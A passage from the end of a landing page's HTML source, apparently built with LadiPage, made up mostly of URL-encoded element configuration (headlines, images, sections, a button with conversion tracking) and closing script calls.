2%7D%2C%22HEADLINE49%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22SECTION51%22%3A%7B%22type%22%3A%22section%22%2C%22mobile.option.background-style%22%3A%22solid%22%7D%2C%22SECTION1%22%3A%7B%22type%22%3A%22section%22%2C%22mobile.option.background-style%22%3A%22image%22%7D%2C%22HEADLINE4%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE5%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22BUTTON6%22%3A%7B%22type%22%3A%22button%22%2C%22option.data_action%22%3A%7B%22type%22%3A%22link%22%2C%22target%22%3A%22_self%22%2C%22action%22%3A%22%3C%3Fphp%20echo%20%24link%3B%20%3F%3E%22%7D%2C%22option.event_custom_script%22%3A%22gtag_report_conversion()%3B%22%7D%2C%22BUTTON_TEXT6%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE7%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22SECTION55%22%3A%7B%22type%22%3A%22section%22%2C%22mobile.option.background-style%22%3A%22solid%22%7D%2C%22IMAGE58%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22IMAGE59%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22IMAGE60%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22IMAGE61%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22IMAGE62%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22IMAGE63%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22IMAGE64%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE42%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22IMAGE65%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE72%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE73%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22IMAGE74%22%3A%7B%22type%22%3A%22image%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE76%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE77%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22PARAGRAPH80%22%3A%7B%22type%22%3A%22paragraph%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%7D";window.LadiPageScript.run(true);window.LadiPageScript.runEventScroll();};run();})();
	</script>
</body>

</html>
